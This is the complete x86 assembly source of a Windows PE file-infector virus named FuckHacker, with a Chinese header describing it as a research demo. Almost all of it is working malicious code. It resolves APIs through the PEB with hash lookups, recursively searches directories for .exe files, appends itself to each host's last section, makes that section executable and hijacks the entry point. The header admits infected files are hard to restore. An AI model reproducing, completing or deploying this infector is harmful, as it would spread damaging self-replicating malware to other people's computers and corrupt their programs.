;============================================================================
;
; WIN32.FUNCKHACKER - WRITTEN BY XFISH
; (c)2009-03
;
;============================================================================
;
; DESCRIPCION
; ===========
; 
;   病毒代码采用PEB获得kernel32基地址，然后通过hash搜索填充api函数(这里Thanks ...    coban2k,Anskya), 病毒整体可
;移植到任何的宿主中,这也就是和网络上目前那些通过静态注入(感染)部分shellcode的区别... 此病毒代码没有加入病毒更多的
;技术，例如epo, 多态等。但是代码我认为却是比较精炼，尤其是Get_Apis过程，填充api方便  快捷 o(∩_∩)o...
;
;  此病毒代码仅仅是为了作为技术研究而使用,所以我限制了传播，在程序中，我做了仅是Loader调用 -
;感染过程，感染过程我仅仅感染Program Files目录的所有exe文件程序代码在宿主中仅仅调用消息框提示给用户.....虽然说
;限制了传播，但是感染后要恢复的话，也不是很容易,所以谨慎使用.....
;==============================================================================

macro @pushsz argc{
call @f
db argc, 0
@@:
}

macro RolHash poffset, [szFuncName]{
  local hash, len, char, temp
  virtual at 0
       db  szFuncName
       len = $
       hash = 0
       temp = 0
       repeat len
	 hash = (((hash shl 3) and 0FFFFFFFFh) or (hash shr (32 - 3))); hash = hash rol 3
	 load char byte from % - 1
	 temp = ((hash and 000000FFh) xor char)
	 hash = (hash and 0FFFFFF00h) or temp
       end repeat
  end virtual
    dd hash
  poffset dd 0
}

  format PE GUI 4.0
   include 'win32ax.inc'
   
   entry  Virus_Entry
   
.code
  ;--------------------------
  Virus_Flag equ 'FISH'
  ;--------------------------
  
 Virus_Entry:
   pushad
   pushfd
   
   call  Dels
 Dels:	
   pop	ebp
   sub	ebp, Dels
   ;-------------------------
   ;填充Api函数地址
   ;-------------------------
   call  GetKrnl32
   lea	edi, [ebp + dwFuncs]
   call  Get_Apis
   @pushsz  'user32'
   call  [ebp + _LoadLibraryA]
   call  Get_Apis
  ;--------------------------------
  ;为了没有危害性，程序判断了在宿主中
  ;不开启感染函数，这样也就无法通过宿主
  ;来进行传播,宿主仅调用提提示函数 感染
  ;仅在Loader中开启.... o(∩_∩)o...
  ;-------------------------------
   mov	eax, [fs:30h]
   mov	eax, [eax+08h]
   cmp	dword [eax+2], Virus_Flag
   jne	.Loader
   ;-----------------------------------
   ;消息框警告用户已经中毒
   ;----------------------------------
   sub	edx, edx
   push  30h
   lea	eax, [ebp + szTitle]
   push  eax
   lea	eax, [ebp + szText]
   push  eax
   push  edx
   call  [ebp + _MessageBoxA]
   ;---------------------------------------
   popfd
   add	esp, 4*8
   lea	eax, [ebp + Jmp_Host]
   jmp	eax
   
  .Loader:
    ;-------------------------
   ;Loader 感染过程
   ;-------------------------
   mov	edx, ebp
   push  '.exe'
   @pushsz  'd:\\temp\\victim'
   call  Inject_Disk
   
   popfd
   popad
   ret
   
 ;(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
 
    
 ;---------------------------------------------
 ; 获得kernel32基地址
 ; input: nothing
 ;---------------------------------------------
 GetKrnl32:
	mov	eax, [fs:30h] 
	irp    offset, 0ch,1ch,00h,08h {mov eax, [eax+offset]} 
	ret 
 ;---------------------------------------------------
 ;获取并填充api函数地址
 ;input : eax =  Krnl32Base , edi = HashFuncAddress
 ;thanks coban2k,Anskya
 ;---------------------------------------------------
 Get_Apis:
   pushad
  xchg	 eax, ebx
  mov	 eax, [ebx+03ch]
  mov	 esi, [eax+ebx+78h]  ; Get Export Rva
  lea	 esi, [esi+ebx+18h]   ; get Export NumberOfFunctions
  
  cld
  lodsd        ; NumberOfFunctions  
  xchg	 eax, ecx
  lodsd        ; AddressOfFunctions
  push	 eax
  lodsd        ; AddressOfNames
  add	 eax, ebx
  xchg	 eax, edx
  lodsd        ; AddressOfNameOrdinals
  add	 eax, ebx
  xchg	 eax, ebp
  xchg	 edx, esi
  
 .Next_Func:
  lodsd
  add	 eax, ebx
  xor	 edx, edx
  
 .Calc_Hash:  
  rol	 edx, 3
  xor	 dl, byte [eax]
  inc	eax
  cmp	byte [eax], 0
  jnz	 .Calc_Hash
  
  push	 edi
  
 .Scan_dw_Funcs:
  cmp	 [edi], edx
  jnz	 .Skip_Function
  
  movzx  eax, word [ebp]
  shl	 eax, 2
  add	 eax, [esp+4]
  mov	 eax, [eax+ebx]
  add	 eax, ebx
  scasd
  stosd
  
 .Skip_Function:
  scasd
  add  edi, 4
  sub	 eax, eax
  cmp	 dword [edi], eax
  jne	 .Scan_dw_Funcs
  
  pop	 edi
  add	 ebp, 2
  loop	.Next_Func
  pop	 ecx
  
  popad
  ret
  
 ;-------------------------------------------
 ; 感染磁盘函数
 ; input: edx = dels(重定位偏移差) 
 ;-------------------------------------------
 proc  Inject_Disk lpszDirectory, dwFileType
    locals
      @hFindFile  rd  1
      @stWfd	WIN32_FIND_DATA
      @szSearch  rb  260
    endl
   pushad
   mov	ebx, edx
   lea	esi, [@szSearch]
   push  [lpszDirectory]
   push  esi
   call  [ebx + _lstrcpyA]
   ;---------------------------------------
   ;esi = @szSearch
   ;copy 文件路径到 esi
   ;---------------------------------------
   @pushsz  '\*.*'
   push  esi
   call  [ebx + _lstrcatA]
   lea	edi, [@stWfd]
   ;----------------------------------------
   ;esi + '\*.*', edi = ptr WIN32_FIND_DATA
   ;---------------------------------------
   push  edi
   push  esi
   call  [ebx + _FindFirstFileA]
  inc  eax
  jz  .Ret
  dec  eax
  mov  [@hFindFile], eax
  .repeat
    pushad
      mov  edi, esi
      xor  eax, eax
      mov  ecx, 260
      rep  movsb
    popad
    ;------------------------------
    cmp  byte [edi+WIN32_FIND_DATA.cFileName], '.'
    je	.FindNext
    ;------------------------------
    push  [lpszDirectory]
    push  esi
    call  [ebx + _lstrcpyA]
  
    @pushsz  '\'
    push  esi
    call  [ebx + _lstrcatA]
    
    lea  edx, [edi+WIN32_FIND_DATA.cFileName]
    push  edx
    push  esi
    call  [ebx + _lstrcatA]
    ;------------------------------
    mov   eax, [edi+WIN32_FIND_DATA.dwFileAttributes]
    and  eax, FILE_ATTRIBUTE_DIRECTORY
    .if  eax = FILE_ATTRIBUTE_DIRECTORY
      mov  edx, ebx
      push  [dwFileType]
      push  esi
      call  Inject_Disk
	jmp  .FindNext
      .endif
    ;-----------------------------
    ; 转换小写
    ;-----------------------------
      push  esi
      call  StrLwr
      
      push  esi
      call  [ebx + _lstrlenA]
      
      mov  edx, [dwFileType]
      cmp  dword [esi+eax-4], edx
      jne  .FindNext
      ;-----------------------------
      ; 进行感染工作
      ;-----------------------------
      mov  eax, esi
      call  Inject_File
      
   .FindNext:
     push  edi
     push  [@hFindFile]
     call  [ebx + _FindNextFileA]
  .until  eax = 0
  
  push	[@hFindFile]
  call	[ebx + _FindClose]
 .Ret:
   popad
   ret
 endp
 
 ;----------------------------------------
 ; 字符串转换小写函数
 ;----------------------------------------
 proc  StrLwr  uses esi edi, pString
  mov  esi, [pString]
  mov  edi, esi
  @@:
  lodsb
  test	al, al
  je  @f
  .if  al >= 'A' & al <= 'Z'
    or	al, 20h
    stosb
    jmp  @b
  .endif
  stosb
  jmp  @b
  @@:
  ret
 endp  
    
 ;---------------------------------------
 ;input: eax - 对齐的值, ecx - 对齐因子
 ;
 ;Ouput: eax - 对齐值
 ;---------------------------------------
 Align_Size:  
   pushad
  xor  edx, edx
  push	eax
  div  ecx
  pop  eax
  sub  ecx, edx
  add  eax, ecx
  mov  [esp+4*7], eax
  popad
  ret
  
 ;--------------------------------------
 ;感染过程
 ;input: eax - 文件路径
 ;
 ;OuPut: nothing
 ;---------------------------------------
 Inject_File:
   pushad
   sub	edx, edx
   
   ;---------------------------------
   ;mov  ebp, ebx ....  ebp = dels
   ;---------------------------------
   mov	ebp, ebx
   push  edx
   push  edx
   push  OPEN_EXISTING
   push  edx
   push  FILE_SHARE_READ
   push  GENERIC_WRITE or GENERIC_READ
   push  eax
   call  [ebp + _CreateFileA]
   inc	eax
   jz  .Open_Faild
   dec	eax
   xchg  eax, ebx
   ;---------------------
   ;ebx - 文件句柄
   ;---------------------
   
   xor	edx, edx
   push  edx
   push  edx
   push  edx
   push  PAGE_READWRITE
   push  edx
   push  ebx
   call  [ebp + _CreateFileMappingA]
   test  eax, eax
   jz  .OpenMap_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - 文件映射句柄
   ;-----------------------
   
   sub	edx, edx
   push  edx
   push  edx
   push  edx
   push  FILE_MAP_WRITE
   push  esi
   call  [ebp + _MapViewOfFile]
   test  eax, eax
   jz  .MapFile_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - 文件映射内存偏移
   ;-----------------------
   
   cmp	word [edi], 'MZ'
   jnz	.Ret
   cmp	dword [edi+2], Virus_Flag
  jz  .Ret
  
  push	0
  push	ebx
  call	[ebp + _GetFileSize]
  
  add  eax, Virus_Size
  mov  edx, [edi+3ch]
  add  edx, edi
  push	dword [edx+3ch]
  pop  ecx
  call	Align_Size
  ;-----------------------
  ;eax - 文件对齐大小
  ;-----------------------
  pushad
  push	edi
  call	[ebp + _UnmapViewOfFile]
  push	esi
  call	[ebp + _CloseHandle]
  popad
  
  push	eax
  xor  edx, edx
   push  edx
   push  eax  
   push  edx
   push  PAGE_READWRITE
   push  edx
   push  ebx
   call  [ebp + _CreateFileMappingA]
   pop	ecx
   or  eax, eax
   jz  .OpenMap_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - 文件映射句柄
   ;ecx - 文件对齐大小
   ;-----------------------
   
  sub  edx, edx
   push  ecx
   push  edx
   push  edx
   push  FILE_MAP_WRITE
   push  esi
   call  [ebp + _MapViewOfFile]
   test  eax, eax
   jz  .MapFile_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - 文件映射内存偏移
   ;-----------------------
 
   mov	edx, [edi+3ch]
   cmp	word [edx+edi], 'PE'
   jnz	.Ret
   
   ;-----------------------
   ;edx - PE头结构偏移
   ;ecx - 节表数量-1的大小
   ;eax - 数据目录段大小
   ;-----------------------
   add	edx, edi
   movzx  ecx, word [edx+06h]
   dec	ecx
   imul  ecx, ecx, 28h
   mov	eax, [edx+74h]
   shl	eax, 3
 
   ;-------------------------
   ;edx - 指向末尾节表位置
   ;-------------------------
   add	edx, 78h
   add	edx, ecx
   add	edx, eax
   
   ;----------------------------------------
   ;ecx = SizeOfRawData + pointerToRawData
   ;----------------------------------------
   mov	ecx, [edx+14h]
   add	ecx, [edx+10h]
   push  ecx
   
   ;---------------------------------------
   ;New oep = SizeOfRawData +　virtual address
   ;    eax = [edx+10h]　   +　[edx+0ch]
   ;---------------------------------------
   mov	eax, [edx+10h]
   add	eax, [edx+0ch]
   
   ;---------------------------------------
   ;  计算jmp相对偏移值，然后写入
   ;---------------------------------------
   mov	ecx, [edi+3ch]
   pushad
   xchg  eax, edx
   add	edx, Jmp_Size
   mov	eax, [ecx+edi+28h]
   sub	eax, edx
   mov	[ebp + Jmp_Addr], eax
   popad
   
   ;-----------------------------------
   ;[ecx+edi+28h] = AddressOfEntryPoint
   ;-----------------------------------
   mov	[ecx+edi+28h], eax
   
   ;-----------------------------
   ;[edx+10h] - SizeOfRawData
   ;[ecx+edi+3ch] - File Aligment
   ;----------------------------
   mov	eax, [edx+10h]
   add	eax, Virus_Size
   mov	ecx, [edi+3ch]
   mov	ecx, [ecx+edi+3ch]
   call  Align_Size
   
   ;-----------------------------
   ;[edx+10h] - SizeOfRawData
   ;[edx+08h] - VirtualSize
   ;[ecx+edi+50h] - SizeOfImage
   ;0A0000020h - 可读可写可执行的节属性
   ;------------------------------
   mov	[edx+10h], eax
   mov	[edx+08h], eax
   
   ;-----------eax + virtual address--------
   add	eax, [edx+0ch]
   mov	ecx, [edi+3ch]
   mov	[ecx+edi+50h], eax
   or  dword [edx+24h], 0A0000020h
   mov	dword [edi+2], Virus_Flag
   
   pop	eax ;取出临时存储
   
   ;-----------------------------------
   pushad
   xchg  eax, esi
   add	esi, edi
   xchg  esi, edi
   
   lea	esi, [ebp + Virus_Entry]
   mov	ecx, Virus_Size
   rep	movsb
   popad
 .Ret:
   push  edi
   call  [ebp + _UnmapViewOfFile]
 .MapFile_Faild:
   push  esi
   call  [ebp + _CloseHandle]  
 .OpenMap_Faild:
   push  ebx
   call  [ebp + _CloseHandle]
 .Open_Faild:
   popad
   ret
   
  ; ----------------------------------------------   
  ;  Jmp  HostAddress
  Jmp_Host:
   jmp	12345678
    Jmp_Addr = $ - 4
    Jmp_Size = $ - Virus_Entry
  ; ----------------------------------------------


 ;--------------------------------------------------------------
   szText    db  'Win32 PE Virus Demo, The Worm Name Is FuckHacker o(∩_∩)o.........', 0
   szTitle    db  'Win32 PE Virus Demo', 0
 
 dwFuncs:
   RolHash    _lstrcpyA, 'lstrcpyA'
   RolHash    _lstrcatA, 'lstrcatA'
   RolHash   _lstrlenA, 'lstrlenA'
   ;RolHash  _CreateThread, 'CreateThread'
   ;RolHash  _CreateEventA, 'CreateEventA'
   ;RolHash  _GetLastError, 'GetLastError'
   ;RolHash  _ExitThread, 'ExitThread'
   RolHash    _FindFirstFileA, 'FindFirstFileA'
   RolHash   _FindNextFileA, 'FindNextFileA'
   RolHash    _FindClose, 'FindClose'
   RolHash    _CreateFileA, 'CreateFileA'
   RolHash   _WriteFile, 'WriteFile'
   RolHash   _ReadFile, 'ReadFile'
   RolHash    _GetFileSize, 'GetFileSize'
   RolHash   _CloseHandle, 'CloseHandle'
    RolHash   _LoadLibraryA, 'LoadLibraryA'
    RolHash   _GetProcAddress, 'GetProcAddress'
    RolHash	_MapViewOfFile, 'MapViewOfFile'
    RolHash    _CreateFileMappingA, 'CreateFileMappingA'
    RolHash   _UnmapViewOfFile, 'UnmapViewOfFile'
    RolHash   _MessageBoxA, 'MessageBoxA'
    rd	  4
  ;----------------------------------------------------------

 Virus_Size = $ - Virus_Entry
